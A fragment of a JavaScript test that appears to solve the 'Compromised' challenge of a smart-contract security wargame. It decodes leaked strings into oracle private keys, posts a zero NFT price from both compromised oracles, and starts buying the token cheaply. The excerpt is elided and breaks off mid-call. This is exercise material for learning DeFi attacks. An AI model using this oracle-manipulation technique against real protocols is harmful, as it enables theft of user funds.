...
describe("Compromised challenge", function () {
  ...
  it("Exploit", async function () {
    ...
    let privateKey1 = leakToPrivateKey(
      `4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35`
    );
    let privateKey2 = leakToPrivateKey(
    ...
    await this.oracle
      .connect(compromisedOracle1)
      .postPrice("DVNFT", ethers.utils.parseEther("0"));
    await this.oracle
      .connect(compromisedOracle2)
      .postPrice("DVNFT", ethers.utils.parseEther("0"));
    ...
    await this.exchange.on(
      "TokenBought",
      async (sender, tokenId, currentPriceInWei) => {
        await this.nftToken
          .connect(attacker)
